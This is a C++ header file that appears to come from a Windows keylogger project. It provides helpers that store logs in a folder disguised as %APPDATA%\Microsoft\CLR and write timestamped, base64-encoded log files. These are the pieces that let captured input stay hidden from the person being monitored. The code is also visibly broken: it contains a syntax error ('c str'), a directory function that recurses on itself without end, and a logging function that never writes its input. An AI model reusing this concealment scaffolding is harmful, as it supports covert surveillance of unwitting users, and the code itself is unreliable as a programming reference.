#ifndef IO_H
#define IO_H

#include<string>
#include<cstdlib> //use for the getin() function
#include<fstream>
#include"windows.h"
#include "Helper.h"
#include "base64.h"

namespace IO
{
    //create a function to retireive all the designate logs
    std::string GetOurPath (const bool append_separator = false)
    {
        //this function checks if the backslash will be needed or not
        //C:\Users\USERNAME\AppData\Roaming

        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR"; //adding a backslash
        return full + (append_separator ? "\\" : "");
    }

    bool MkOneDr(std::string path)
    {
        return (bool) CreateDirectory(path.c str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool MKDir(std:: string path)
    {
        for(char &c: path)
        {
            if(c == '\\')
            {
                c = '\0';
                if(!MKDir(path))
                    return false;
                c = '\\';
            }
        }
        return true;
    }

    template <class T>
    std::string WriteLog (const T &t)
    {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateString("_") + ".log"; //underline is used instaed of colon becose windows reserve :

        try
        {
            std::ofstream file(path + name);
            if(!file) return "";
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" << std::endl << std::endl;
            std::string data = Base64::EncryptB64(s.str());
            file << data;
            if(!file)
                return "";
            file.close();
            return name;
        } catch(...)
        {
            return "";
        }
    }
}



#endif // IO_H
